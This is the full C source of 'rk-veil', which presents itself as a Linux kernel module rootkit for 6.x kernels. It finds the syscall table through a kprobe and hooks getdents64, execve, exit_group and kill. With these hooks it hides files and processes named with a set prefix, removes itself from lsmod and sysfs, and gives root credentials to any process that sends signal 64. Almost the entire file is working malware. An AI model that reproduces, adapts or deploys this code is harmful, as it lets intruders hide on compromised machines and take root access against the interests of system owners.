#include <asm/pgtable.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/mm.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("jonbttt");
MODULE_DESCRIPTION("rk-veil: LKM Rootkit for Linux 6.x");
MODULE_VERSION("1.0");

/* Magic String
 * 
 * Set prefix for files, directories, and process names to hide
 */
#define HIDE_PREFIX "rkveil_"

/* Hidden PID List
 *
 * Maintains a fixed-size array of PIDs that should be hidden from userspace.
 * Protected by a spinlock for safe concurrent access from multiple hooks.
 * Populated by hook_execve when a matching process is spawned, and cleaned
 * up by hook_exit_group when the process exits.
 */
#define MAX_HIDDEN_PIDS 64

static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int hidden_pid_count = 0;
static DEFINE_SPINLOCK(hidden_pid_lock);

static void add_hidden_pid(pid_t pid)
{
    spin_lock(&hidden_pid_lock);
    if (hidden_pid_count < MAX_HIDDEN_PIDS)
        hidden_pids[hidden_pid_count++] = pid;
    spin_unlock(&hidden_pid_lock);
}

static void remove_hidden_pid(pid_t pid)
{
    int i;
    spin_lock(&hidden_pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            hidden_pids[i] = hidden_pids[--hidden_pid_count];
            break;
        }
    }
    spin_unlock(&hidden_pid_lock);
}

static int is_hidden_pid(pid_t pid)
{
    int i, found = 0;
    spin_lock(&hidden_pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) { found = 1; break; }
    }
    spin_unlock(&hidden_pid_lock);
    return found;
}

/* Syscall Table Resolution
 *
 * On kernel >= 5.7, kallsyms_lookup_name() is no longer exported to modules.
 * We resolve this at runtime by registering a kprobe on the symbol. The kernel
 * fills kp.addr with the function's address before invoking the pre_handler.
 * We then cast that address to a function pointer and use it to look up the
 * syscall table address directly.
 */
static unsigned long *__sys_call_table;

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};

static unsigned long *get_syscall_table(void)
{
    unsigned long *sct;
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
    kallsyms_lookup_name_t kln;

    if (register_kprobe(&kp) < 0)
        return NULL;
    kln = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    sct = (unsigned long *)kln("sys_call_table");
    return sct;
}

/* PTE Write-Protect Helpers
 *
 * On kernel >= 5.4, the syscall table page is marked read-only at the page
 * table entry level (_PAGE_RW cleared), making CR0 WP-bit manipulation
 * insufficient. We use lookup_address() to find the PTE for the syscall table
 * page and set the RW bit directly before patching, restoring it afterward.
 */
static pte_t *pte;
static unsigned int pte_level;

static inline void unprotect_memory(void)
{
    pte = lookup_address((unsigned long)__sys_call_table, &pte_level);
    if (pte) {
        pte->pte |= _PAGE_RW;
        barrier();
    }
}

static inline void protect_memory(void)
{
    if (pte) {
        pte->pte &= ~_PAGE_RW;
        barrier();
    }
}

/* Module Self-Hiding
 *
 * The kernel maintains a doubly-linked list of all loaded modules. Unlinking
 * THIS_MODULE from that list makes it invisible to lsmod and /proc/modules.
 * We also call kobject_del() to remove the entry from /sys/module/. The
 * previous list entry is saved so the module can be re-linked on unload.
 */
static struct list_head *prev_module = NULL;

static void rk_hide(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

static void rk_reveal(void)
{
    if (prev_module)
        list_add(&THIS_MODULE->list, prev_module);
}

/* PID List Check for getdents64
 *
 * Helper used by hook_getdents64 to determine whether a numeric directory
 * entry (e.g. a /proc/<pid> entry) belongs to a hidden process. Parses the
 * entry name as a PID and checks it against the hidden PID list.
 */
static int should_hide_pid(const char *name)
{
    unsigned long pid_nr;
    if (kstrtoul(name, 10, &pid_nr) != 0)
        return 0;
    return is_hidden_pid((pid_t)pid_nr);
}

/* getdents64 Hook
 *
 * getdents64 is the syscall used by ls, ps, find, and similar commands to
 * enumerate directory entries. We call the original syscall first, then copy
 * the result buffer into kernel space, strip any entries with a name starting
 * with HIDE_PREFIX or the numeric name matching a hidden PID, and copy the
 * modified buffer back to userspace. This hides both files and /proc/<pid>
 * entries without affecting direct path access.
 */
typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
static orig_getdents64_t orig_getdents64;

asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *kdirent;
    struct linux_dirent64 *cur;
    long offset = 0;
    long ret;
    
    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    dirent = (struct linux_dirent64 *)regs->si;
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    while (offset < ret) {
        cur = (struct linux_dirent64 *)((char *)kdirent + offset);
        if (strncmp(cur->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0 ||
            should_hide_pid(cur->d_name)) {
            memmove(cur, (char *)cur + cur->d_reclen,
                    ret - offset - cur->d_reclen);
            ret -= cur->d_reclen;
        } else {
            offset += cur->d_reclen;
        }
    }

    if (copy_to_user(dirent, kdirent, ret)) {
        kfree(kdirent);
        return -EFAULT;
    }

    kfree(kdirent);
    return ret;
}

/* execve Hook (Automatic Process Hiding)
 *
 * Intercepts all execve calls to check argv[0] before the new process image
 * is loaded. If argv[0] starts with HIDE_PREFIX, the resulting PID is added
 * to the hidden PID list after a successful exec. This allows any process
 * spawned with a matching name (e.g. exec -a "rkveil_backdoor" ./binary) to
 * be automatically hidden without any manual intervention.
 */
typedef asmlinkage long (*orig_execve_t)(const struct pt_regs *);
static orig_execve_t orig_execve;

asmlinkage long hook_execve(const struct pt_regs *regs)
{
    char __user * __user *argv = (char __user * __user *)regs->si;
    char __user *argv0_ptr = NULL;
    char argv0[NAME_MAX] = {0};
    char *base;
    int should_hide = 0;
    long ret;

    /* Read argv[0] */
    if (argv && get_user(argv0_ptr, argv) == 0 && argv0_ptr) {
        if (strncpy_from_user(argv0, argv0_ptr, NAME_MAX) > 0) {
            base = strrchr(argv0, '/');
            base = base ? base + 1 : argv0;
            if (strncmp(base, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
                should_hide = 1;
        }
    }

    ret = orig_execve(regs);

    if (ret == 0 && should_hide) {
        add_hidden_pid(current->pid);
    }

    return ret;
}

/* exit_group Hook (Hidden PID Cleanup)
 *
 * Intercepts process exit to remove the exiting PID from the hidden PID list.
 * Prevents stale entries from accumulating if hidden PIDs are reused by the
 * kernel for new processes after exit.
 */
typedef asmlinkage long (*orig_exit_group_t)(const struct pt_regs *);
static orig_exit_group_t orig_exit_group;

asmlinkage long hook_exit_group(const struct pt_regs *regs)
{
    remove_hidden_pid(current->pid);
    return orig_exit_group(regs);
}

/* kill Hook (Privilege Escalation Backdoor)
 *
 * Intercepts kill() calls and treats signal 64 (an unused real-time signal)
 * as a trigger for privilege escalation. When any process sends signal 64,
 * we use prepare_creds() to clone the current credentials, zero all uid/gid
 * fields, and commit the modified credentials back to the calling process via
 * commit_creds(). The signal is consumed and never delivered to the target.
 * Normal signals pass through to the original handler unmodified.
 */
typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
static orig_kill_t orig_kill;

asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = (int)regs->si;

    if (sig == 64) {
        struct cred *root;
        root = prepare_creds();
        if (root == NULL)
            return 0;
        root->uid.val  = root->gid.val  = 0;
        root->euid.val = root->egid.val = 0;
        root->suid.val = root->sgid.val = 0;
        root->fsuid.val = root->fsgid.val = 0;
        commit_creds(root);
        printk(KERN_DEBUG "rk-veil: priv-esc triggered by pid %d\n", current->pid);
        return 0;
    }
    return orig_kill(regs);
}

/* Hook Install / Uninstall Macros
 *
 * HOOK saves the original syscall pointer, unprotects the syscall table page,
 * overwrites the slot with our hook function, then re-protects the page.
 * UNHOOK reverses the process, restoring the original pointer. Both macros
 * use the PTE write-protect helpers to safely modify the read-only page.
 */
#define HOOK(__table, __nr, __hook, __orig)             \
    do {                                                \
        (__orig) = (void *)(__table)[(__nr)];           \
        unprotect_memory();                             \
        (__table)[(__nr)] = (unsigned long)(__hook);    \
        protect_memory();                               \
    } while (0)

#define UNHOOK(__table, __nr, __orig)                   \
    do {                                                \
        unprotect_memory();                             \
        (__table)[(__nr)] = (unsigned long)(__orig);    \
        protect_memory();                               \
    } while (0)

/* Init / Exit */
static int __init rk_init(void)
{
    printk(KERN_INFO "\n");
    printk(KERN_INFO "  ██████╗ ██╗  ██╗       ██╗   ██╗███████╗██╗██╗     \n");
    printk(KERN_INFO "  ██╔══██╗██║ ██╔╝       ██║   ██║██╔════╝██║██║     \n");
    printk(KERN_INFO "  ██████╔╝█████╔╝ █████╗ ██║   ██║█████╗  ██║██║     \n");
    printk(KERN_INFO "  ██╔══██╗██╔═██╗ ╚════╝ ╚██╗ ██╔╝██╔══╝  ██║██║     \n");
    printk(KERN_INFO "  ██║  ██║██║  ██╗        ╚████╔╝ ███████╗██║███████╗\n");
    printk(KERN_INFO "  ╚═╝  ╚═╝╚═╝  ╚═╝         ╚═══╝  ╚══════╝╚═╝╚══════╝\n");
    printk(KERN_INFO "  Author : jonbttt | Version: 1.0\n\n");

    rk_hide();
    printk(KERN_DEBUG "rk-veil: module hidden\n");

    __sys_call_table = get_syscall_table();
    if (!__sys_call_table) {
        printk(KERN_ERR "rk-veil: could not resolve sys_call_table\n");
        return -EFAULT;
    }
    printk(KERN_DEBUG "rk-veil: sys_call_table @ %px\n", __sys_call_table);

    HOOK(__sys_call_table, __NR_getdents64, hook_getdents64, orig_getdents64);
    HOOK(__sys_call_table, __NR_execve,     hook_execve,     orig_execve);
    HOOK(__sys_call_table, __NR_exit_group, hook_exit_group, orig_exit_group);
    HOOK(__sys_call_table, __NR_kill, hook_kill, orig_kill);
    printk(KERN_DEBUG "rk-veil: hooks installed (getdents64, execve, exit_group, kill)\n");

    printk(KERN_INFO "  Status : [+] Loaded\n\n");
    return 0;
}

static void __exit rk_exit(void)
{
    if (__sys_call_table) {
        UNHOOK(__sys_call_table, __NR_getdents64, orig_getdents64);
        UNHOOK(__sys_call_table, __NR_execve,     orig_execve);
        UNHOOK(__sys_call_table, __NR_exit_group, orig_exit_group);
        UNHOOK(__sys_call_table, __NR_kill, orig_kill);
    }
    rk_reveal();
    printk(KERN_INFO "rk-veil: [-] Unloaded\n");
}

module_init(rk_init);
module_exit(rk_exit);